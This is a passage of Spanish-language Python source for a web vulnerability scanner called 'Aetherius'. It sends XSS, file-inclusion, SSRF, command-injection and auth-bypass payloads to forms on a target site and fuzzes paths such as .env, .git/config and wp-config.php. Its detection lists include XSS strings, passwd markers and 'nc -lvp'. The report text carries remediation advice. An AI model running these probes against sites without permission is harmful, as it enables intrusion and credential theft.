                log_func(f"[*] Probando Cross-Site Scripting (XSS) en parámetro: {input_name}")
                for payload in xss_payloads:
                    if test_vulnerability(target_url, method, {input_name: payload}, "XSS", log_func):
                        content = f"- **URL:** {target_url}\n"
                        content += f"- **Parámetro afectado:** `{input_name}`\n"
                        content += f"- **Payload:** `{payload}`\n"
                        content += "- **Descripción:** El servidor reflejó el payload de XSS en la respuesta, lo que indica que no se está filtrando la entrada adecuadamente.\n"
                        content += "- **Impacto:** Un atacante podría ejecutar código malicioso en el navegador de los usuarios para robar cookies de sesión, credenciales o redirigirlos a sitios maliciosos.\n"
                        content += "- **Recomendación:** Escapar o sanitizar toda la entrada de usuario antes de mostrarla en la página. Usar un `Content Security Policy` (CSP) para restringir las fuentes de scripts."
                        log_func(f"\n[!] Vulnerabilidad encontrada: Cross-Site Scripting (XSS)")
                        log_func(content)
                        add_to_report("Vulnerabilidad de Cross-Site Scripting (XSS)", content, log_func)

                # LFI/RFI
                log_func(f"[*] Probando Inclusión de Archivos (LFI/RFI) en parámetro: {input_name}")
                for payload in lfi_rfi_payloads:
                    if test_vulnerability(target_url, method, {input_name: payload}, "LFI/RFI", log_func):
                        content = f"- **URL:** {target_url}\n"
                        content += f"- **Parámetro afectado:** `{input_name}`\n"
                        content += f"- **Payload:** `{payload}`\n"
                        content += "- **Descripción:** El servidor respondió de forma inesperada al inyectar un payload de inclusión de archivos local o remoto (LFI/RFI). Esto sugiere una posible vulnerabilidad de inclusión de archivos.\n"
                        content += "- **Impacto:** Un atacante podría acceder a archivos sensibles del servidor o incluir scripts maliciosos de servidores remotos.\n"
                        content += "- **Recomendación:** Validar y sanitizar estrictamente las entradas de usuario, deshabilitar la inclusión de archivos remotos (`allow_url_include=Off` en PHP) y restringir el acceso a directorios sensibles."
                        log_func(f"\n[!] Vulnerabilidad encontrada: Inclusión de Archivos (LFI/RFI)")
                        log_func(content)
                        add_to_report("Vulnerabilidad de Inclusión de Archivos (LFI/RFI)", content, log_func)

                # SSRF
                log_func(f"[*] Probando Server-Side Request Forgery (SSRF) en parámetro: {input_name}")
                for payload in ssrf_payloads:
                    if test_vulnerability(target_url, method, {input_name: payload}, "SSRF", log_func):
                        content = f"- **URL:** {target_url}\n"
                        content += f"- **Parámetro afectado:** `{input_name}`\n"
                        content += f"- **Payload:** `{payload}`\n"
                        content += "- **Descripción:** El servidor procesó una URL externa o interna de forma inesperada, lo que sugiere una posible vulnerabilidad de SSRF.\n"
                        content += "- **Impacto:** Un atacante podría acceder a recursos internos, como metadatos de servidores en la nube, o realizar solicitudes a servicios externos.\n"
                        content += "- **Recomendación:** Validar y restringir las URLs aceptadas en los parámetros de entrada. Usar listas blancas para dominios permitidos."
                        log_func(f"\n[!] Vulnerabilidad encontrada: Server-Side Request Forgery (SSRF)")
                        log_func(content)
                        add_to_report("Vulnerabilidad de Server-Side Request Forgery (SSRF)", content, log_func)

                # Inyección de Comandos
                log_func(f"[*] Probando Inyección de Comandos en parámetro: {input_name}")
                for payload in command_injection_payloads:
                    if test_vulnerability(target_url, method, {input_name: payload}, "Command Injection", log_func):
                        content = f"- **URL:** {target_url}\n"
                        content += f"- **Parámetro afectado:** `{input_name}`\n"
                        content += f"- **Payload:** `{payload}`\n"
                        content += "- **Descripción:** El servidor ejecutó un comando potencialmente malicioso, indicando una vulnerabilidad de inyección de comandos.\n"
                        content += "- **Impacto:** Un atacante podría ejecutar comandos arbitrarios en el servidor, lo que podría llevar a la compromisión total del sistema.\n"
                        content += "- **Recomendación:** Sanitizar estrictamente todas las entradas de usuario y evitar el uso de funciones que ejecuten comandos del sistema (como `exec` o `system` en PHP)."
                        log_func(f"\n[!] Vulnerabilidad encontrada: Inyección de Comandos")
                        log_func(content)
                        add_to_report("Vulnerabilidad de Inyección de Comandos", content, log_func)

            # Detección de CSRF
            if method == "POST" and not csrf_token:
                content = f"- **URL:** {target_url}\n"
                content += "- **Descripción:** El formulario no contiene un token CSRF, lo que lo hace potencialmente vulnerable a ataques de Cross-Site Request Forgery.\n"
                content += "- **Impacto:** Un atacante podría engañar a usuarios autenticados para que realicen acciones no deseadas en el sitio.\n"
                content += "- **Recomendación:** Implementar tokens CSRF únicos en todos los formularios POST y validar su presencia en el servidor."
                log_func(f"\n[!] Vulnerabilidad encontrada: Falta de Protección CSRF")
                log_func(content)
                add_to_report("Falta de Protección CSRF", content, log_func)

            # Pruebas de autenticación débil
            if any(input_field['type'] in ['password', 'text'] and input_field['name'].lower() in ['username', 'user', 'password', 'pass', 'login'] for input_field in inputs):
                log_func(f"[*] Probando autenticación débil en {target_url}")
                for payload in auth_bypass_payloads:
                    if test_vulnerability(target_url, method, payload, "Auth Bypass", log_func):
                        content = f"- **URL:** {target_url}\n"
                        content += f"- **Payload:** `{payload}`\n"
                        content += "- **Descripción:** El servidor permitió el acceso con credenciales débiles o un bypass de autenticación, indicando una vulnerabilidad en el sistema de autenticación.\n"
                        content += "- **Impacto:** Un atacante podría obtener acceso no autorizado a cuentas de usuario o áreas protegidas.\n"
                        content += "- **Recomendación:** Implementar políticas de contraseñas fuertes, limitar intentos de inicio de sesión y usar autenticación multifactor."
                        log_func(f"\n[!] Vulnerabilidad encontrada: Autenticación Débil")
                        log_func(content)
                        add_to_report("Vulnerabilidad de Autenticación Débil", content, log_func)

        return forms

    except requests.RequestException as e:
        log_func(f"[!] Error al obtener la página: {e}")
        return None
    except Exception as e:
        log_func(f"[!] Error inesperado en análisis de vulnerabilidades: {e}")
        return None

def test_vulnerability(url, method, data, vuln_type, log_func):
    """Prueba vulnerabilidades enviando payloads."""
    try:
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'}
        if method == "POST":
            response = requests.post(url, data=data, timeout=5, headers=headers, allow_redirects=True)
        else:  # Asumimos GET
            response = requests.get(url, params=data, timeout=5, headers=headers, allow_redirects=True)

        response.raise_for_status()
        response_text = response.text.lower()

        if vuln_type == "SQL Injection":
            sql_errors = [
                "sql syntax", "mysql", "warning: mysql", "unclosed quotation mark",
                "you have an error in your sql", "sqlite", "psql", "ora-",
                "microsoft sql server", "unknown column", "invalid query"
            ]
            if any(error in response_text for error in sql_errors):
                return True
            if "error" in response_text and ("database" in response_text or "query" in response_text):
                return True
        elif vuln_type == "XSS":
            xss_indicators = [
                "<script>alert('xss')</script>", "onerror=alert('xss')", "<svg onload=alert('xss')>",
                "javascript:alert('xss')", "<img src=x", "<div style=\"background-image: url(javascript:alert('xss'))"
            ]
            if any(indicator in response_text for indicator in xss_indicators):
                return True
        elif vuln_type == "LFI/RFI":
            lfi_rfi_indicators = [
                "root:x:", "password:", "shadow:", "<?php", "phpinfo(",
                "[htpasswd]", "[apache]", "[nginx]", "configuration file"
            ]
            if any(indicator in response_text for indicator in lfi_rfi_indicators):
                return True
            if response.status_code in [200, 500] and len(response.text) > 0 and "html" not in response_text:
                return True
        elif vuln_type == "SSRF":
            ssrf_indicators = [
                "ami-id", "instance-id", "hostname", "local-ipv4", "127.0.0.1",
                "localhost", "metadata", "internal", "private"
            ]
            if any(indicator in response_text for indicator in ssrf_indicators):
                return True
            if response.status_code == 200 and len(response.text) > 0 and "html" not in response_text:
                return True
        elif vuln_type == "Command Injection":
            cmd_indicators = [
                "uid=", "gid=", "groups=", "whoami", "dir", "ls -la",
                "ping -c", "netcat", "nc -lvp", "curl"
            ]
            if any(indicator in response_text for indicator in cmd_indicators):
                return True
            if response.status_code == 200 and len(response.text) > 0 and "html" not in response_text:
                return True
        elif vuln_type == "Auth Bypass":
            auth_indicators = [
                "welcome", "dashboard", "admin", "logged in", "session started",
                "user panel", "success", "authenticated"
            ]
            if any(indicator in response_text for indicator in auth_indicators):
                return True
            if response.status_code == 200 and ("login" not in response_text or "sign in" not in response_text):
                return True
        return False
    except requests.RequestException:
        return False
    except Exception as e:
        log_func(f"[!] Error al probar vulnerabilidad {vuln_type}: {e}")
        return False

def analyze_robots_and_sitemap(url, log_func):
    """Analiza robots.txt y sitemap.xml."""
    log_func(f"\n--- Analizando robots.txt en {url} ---")
    robots_url = f"{url.rstrip('/')}/robots.txt"
    try:
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'}
        response = requests.get(robots_url, timeout=5, headers=headers)
        if response.status_code == 200:
            log_func("Contenido de robots.txt:")
            disallowed_dirs = re.findall(r"Disallow:\s*(.*)", response.text)
            if disallowed_dirs:
                for path in disallowed_dirs:
                    full_url = urllib.parse.urljoin(url, path.strip())
                    log_func(f"  - Directorio prohibido: {full_url}")
                    content = f"- **URL:** {full_url}\n"
                    content += f"- **Descripción:** El archivo `robots.txt` expone un directorio que el propietario del sitio no quiere que los motores de búsqueda indexen. Esto no lo protege de un atacante que conozca la ruta.\n"
                    content += f"- **Impacto:** Podría contener archivos de configuración, copias de seguridad u otra información sensible.\n"
                    content += f"- **Recomendación:** Mover los archivos sensibles fuera del directorio web o protegerlos con autenticación, en lugar de confiar solo en `robots.txt`."
                    add_to_report("Directorio Sensible Expuesto", content, log_func)
            else:
                log_func("No se encontraron directorios prohibidos.")
        else:
            log_func("No se encontró robots.txt")
    except requests.exceptions.RequestException as e:
        log_func(f"[!] Error al acceder a robots.txt: {e}")

    log_func("\n--- Analizando sitemap.xml ---")
    sitemap_url = f"{url.rstrip('/')}/sitemap.xml"
    try:
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'}
        response = requests.get(sitemap_url, timeout=5, headers=headers)
        if response.status_code == 200:
            log_func("Contenido de sitemap.xml:")
            soup = BeautifulSoup(response.text, 'xml')
            urls = soup.find_all('loc')
            if urls:
                for url_tag in urls:
                    log_func(f"  - URL encontrada: {url_tag.text}")
            else:
                log_func("No se encontraron URLs en sitemap.xml.")
        else:
            log_func("No se encontró sitemap.xml")
    except requests.exceptions.RequestException as e:
        log_func(f"[!] Error al acceder a sitemap.xml: {e}")

def check_subdomain(sub, domain, found_subdomains, log_func):
    """Verifica si un subdominio existe."""
    sub_url = f"https://{sub}.{domain}"
    try:
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'}
        response = requests.get(sub_url, timeout=3, allow_redirects=True, headers=headers)
        if response.status_code == 200:
            found_subdomains.append(sub_url)
            log_func(f"  [+] Subdominio encontrado: {sub_url}")
    except requests.exceptions.RequestException:
        pass

def enumerate_subdomains(url, log_func):
    """Enumera subdominios comunes."""
    log_func(f"\n--- Enumerando subdominios en {url} ---")
    domain = urllib.parse.urlparse(url).netloc

    subdomains = [
        "www", "blog", "dev", "test", "api", "admin", "mail", "shop", "ftp",
        "webmail", "cpanel", "vpn", "ns1", "ns2", "git", "status", "jira",
        "login", "secure", "static", "images", "cdn", "staging", "beta",
        "proxy", "docs", "portal", "support", "dashboard", "app", "wiki"
    ]
    found_subdomains = []

    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = {executor.submit(check_subdomain, sub, domain, found_subdomains, log_func) for sub in subdomains}
        for future in futures:
            future.result()  # Esperar a que todos los hilos terminen

    if not found_subdomains:
        log_func("No se encontraron subdominios comunes.")
    else:
        content = f"- **URL base:** {domain}\n"
        content += "- **Subdominios encontrados:**\n"
        for sub in found_subdomains:
            content += f"  - {sub}\n"
        content += "- **Descripción:** Los subdominios pueden ser puntos de entrada para ataques. A menudo contienen versiones de desarrollo, servidores de prueba o servicios que no están tan protegidos como la página principal.\n"
        content += "- **Recomendación:** Asegurarse de que todos los subdominios estén debidamente protegidos y no expongan información sensible."
        add_to_report("Subdominios Encontrados", content, log_func)

def extract_metadata_from_page(target_url, log_func):
    """Extrae metadatos de archivos en la página."""
    log_func(f"\n--- Extrayendo metadatos de {target_url} ---")
    try:
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'}
        response = requests.get(target_url, timeout=10, headers=headers)
        response.raise_for_status()
        soup = BeautifulSoup(response.text, 'html.parser')

        file_urls = []
        for tag in soup.find_all(['a', 'img', 'link', 'script']):
            link = tag.get('href') or tag.get('src')
            if link and (link.lower().endswith(('.jpg', '.jpeg', '.png', '.pdf'))):
                file_urls.append(urllib.parse.urljoin(target_url, link))

        unique_urls = list(set(file_urls))

        if not unique_urls:
            log_func("No se encontraron archivos con metadatos comunes en la página.")
            return

        for url in unique_urls:
            try:
                log_func(f"Analizando metadatos de: {url}")
                file_response = requests.get(url, timeout=10, headers=headers)
                file_response.raise_for_status()

                metadata_found = {}
                file_extension = url.split('.')[-1].lower()

                if file_extension in ['jpg', 'jpeg', 'png']:
                    try:
                        img = Image.open(io.BytesIO(file_response.content))
                        exif_data = img.getexif()
                        if exif_data:
                            for tag_id in exif_data:
                                tag = img._getexif().get(tag_id)
                                if tag:
                                    metadata_found[f"EXIF {tag_id}"] = tag
                    except Exception as e:
                        log_func(f"[!] Error al procesar metadatos de imagen de {url}: {e}")

                elif file_extension == 'pdf':
                    try:
                        pdf_reader = PdfReader(io.BytesIO(file_response.content))
                        if pdf_reader.metadata:
                            for key, value in pdf_reader.metadata.items():
                                metadata_found[key] = value
                    except Exception as e:
                        log_func(f"[!] Error al procesar metadatos de PDF de {url}: {e}")

                if metadata_found:
                    content = f"- **URL:** {url}\n"
                    content += "- **Descripción:** Se encontraron metadatos en un archivo público. Esta información podría ser utilizada por atacantes para la recopilación de inteligencia.\n"
                    content += "- **Metadatos encontrados:**\n"
                    for key, value in metadata_found.items():
                        content += f"  - `{key}`: {value}\n"
                    content += "- **Recomendación:** Limpiar o eliminar los metadatos de todos los archivos antes de subirlos a un servidor web público."
                    add_to_report("Metadatos Sensibles Expuestos", content, log_func)
                else:
                    log_func(f"No se encontraron metadatos procesables en {url}.")

            except requests.exceptions.RequestException as e:
                log_func(f"[!] Error al descargar archivo de metadatos de {url}: {e}")

    except requests.exceptions.RequestException as e:
        log_func(f"[!] Error al acceder a la URL principal para buscar archivos: {e}")
    except Exception as e:
        log_func(f"[!] Error inesperado al extraer metadatos: {e}")

def run_cli_mode():
    """Ejecuta el modo CLI."""
    print(ascii_art)
    def cli_log(text):
        print(text)
    print("Modo de terminal activado. Escribe 'ayuda' para ver las opciones o 'salir' para terminar.")

    diccionario_directorios = [
        "admin", "login", "panel", "user", "dashboard", "settings", "config", "backup", "upload", "download",
        "api", "webmail", "phpmyadmin", "cgi-bin", "test", "dev", "stage", "tmp", "logs", "include",
        "lib", "src", "vendor", "public", "private", "protected", "cache", "session", "tmp", "uploads",
        "downloads", "images", "scripts", "styles", "js", "css", "fonts", "robots.txt", "sitemap.xml",
        "crossdomain.xml", "favicon.ico", "wp-admin", "wp-content", "wp-includes", "wp-config.php",
        "wp-login.php", "wp-signup.php", "wp-cron.php", "wp-trackback.php", "wp-comments-post.php",
        "wp-mail.php", "wp-settings.php", "wp-load.php", "wp-blog-header.php", "wp-links-opml.php",
        "wp-atom.php", "wp-rdf.php", "wp-rss.php", "wp-rss2.php", "wp-feed.php", "wp-commentsrss2.php",
        "wp-app.php", "wp-embed.php", "wp-json", "xmlrpc.php", "license.txt", "readme.html",
        ".git/config", ".env", "config.ini", "web.config", "database.sql", "dump.sql"
    ]

    while True:
        comando = input("\nAetherius > ").strip().lower()
        partes = comando.split()

        if not partes:
            continue

        if partes[0] == "salir":
            print("Saliendo de Aetherius.")
            break

        elif partes[0] == "ayuda":
            print("\nComandos disponibles:")
            print("  ayuda                          - Muestra este menú.")
            print("  analizar <opcion> <url>        - Ejecuta un escaneo específico.")
            print("  ejemplo: analizar completo https://ejemplo.com")
            print("  salir                          - Sale del programa.")
            print("\nOpciones de escaneo:")
            print("  completo         - Escaneo completo.")
            print("  html             - Detección de directorios HTML.")
            print("  fuzzing          - Fuzzing de directorios.")
            print("  headers          - Detección de encabezados HTTP.")
            print("  nmap             - Escaneo con Nmap.")
            print("  osint            - Análisis OSINT.")
            print("  osint-avanzado   - Análisis de robots.txt, subdominios y metadatos.")
            print("  vulnerabilidades - Detección avanzada de vulnerabilidades web.")

        elif partes[0] == "analizar":
            if len(partes) < 3:
                print("Error: El comando 'analizar' requiere una opción y una URL.")
                continue

            opcion = partes[1]
            url = partes[2]

            if not validators.url(url):
                if not url.startswith(('http://', 'https://')):
                    url = f"https://{url}"
                if not validators.url(url):
                    print("Error: La URL ingresada no es válida. Asegúrate de que sea un dominio válido (ej. https://example.com o example.com).")
                    continue

            print(f"\nIniciando escaneo '{opcion}' en {url}...")

            if opcion == "completo":
                cli_log("=" * 50)
                cli_log("Iniciando escaneo completo...")
                cli_log("=" * 50)
                cli_log("\n--- Analizando Directorios HTML ---")
                get_directories_from_html(url, cli_log)
                cli_log("\n--- Realizando Fuzzing ---")
                fuzz_url(url, diccionario_directorios, cli_log)
                cli_log("\n--- Detectando Encabezados HTTP ---")
                detect_http_headers(url, cli_log)
                cli_log("\n--- Escaneo con Nmap ---")
                run_nmap_scan(url, cli_log)
                cli_log("\n--- Análisis OSINT ---")
                osint_analysis(url, cli_log)
                cli_log("\n--- Análisis OSINT Avanzado ---")
                analyze_robots_and_sitemap(url, cli_log)
                enumerate_subdomains(url, cli_log)
                extract_metadata_from_page(url, cli_log)
                cli_log("\n--- Buscando Vulnerabilidades Web ---")
                vulnerability_scan(url, cli_log)
                cli_log("\nAnálisis completado. Generando reporte...")
                save_report_to_file(url, cli_log)

            elif opcion == "html":
                cli_log("\n--- Analizando Directorios HTML ---")
                get_directories_from_html(url, cli_log)
                cli_log("\nAnálisis completado. Generando reporte...")
                save_report_to_file(url, cli_log)

            elif opcion == "fuzzing":
                cli_log("\n--- Realizando Fuzzing ---")
                fuzz_url(url, diccionario_directorios, cli_log)
                cli_log("\nAnálisis completado. Generando reporte...")
                save_report_to_file(url, cli_log)

            elif opcion == "headers":
                cli_log("\n--- Detectando Encabezados HTTP ---")
                detect_http_headers(url, cli_log)
                cli_log("\nAnálisis completado. Generando reporte...")
                save_report_to_file(url, cli_log)

            elif opcion == "nmap":
                cli_log("\n--- Escaneo con Nmap ---")
                run_nmap_scan(url, cli_log)
                cli_log("\nAnálisis completado. Generando reporte...")
                save_report_to_file(url, cli_log)

            elif opcion == "osint":
                cli_log("\n--- Análisis OSINT ---")
                osint_analysis(url, cli_log)
                cli_log("\nAnálisis completado. Generando reporte...")
                save_report_to_file(url, cli_log)

            elif opcion == "osint-avanzado":
                cli_log("\n--- Análisis OSINT Avanzado ---")
                analyze_robots_and_sitemap(url, cli_log)
                enumerate_subdomains(url, cli_log)
                extract_metadata_from_page(url, cli_log)
                cli_log("\nAnálisis completado. Generando reporte...")
                save_report_to_file(url, cli_log)

            elif opcion == "vulnerabilidades":
                cli_log("\n--- Buscando Vulnerabilidades Web ---")
                forms = vulnerability_scan(url, cli_log)
                if forms:
                    cli_log("\n--- Resultados de vulnerabilidades ---")
                    for form in forms:
                        cli_log(f"\nFormulario encontrado en {urllib.parse.urljoin(url, form['action'])}:")
                        cli_log(f"  Método: {form['method']}")
                        cli_log("  Entradas:")
                        for input_field in form['inputs']:
                            cli_log(f"    - Nombre: {input_field['name']}, Tipo: {input_field['type']}, Placeholder: {input_field['placeholder']}")
                        cli_log(f"  Token CSRF presente: {'Sí' if form['csrf_token'] else 'No'}")
                else:
                    cli_log("No se encontraron formularios o vulnerabilidades.")
                cli_log("\nAnálisis completado. Generando reporte...")
                save_report_to_file(url, cli_log)

            else:
                print("Error: Opción de escaneo no reconocida.")
        else:
            print("Comando no reconocido. Escribe 'ayuda' para ver las opciones.")

if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "--gui":
        app = App()
        app.mainloop()
    else:
        run_cli_mode()

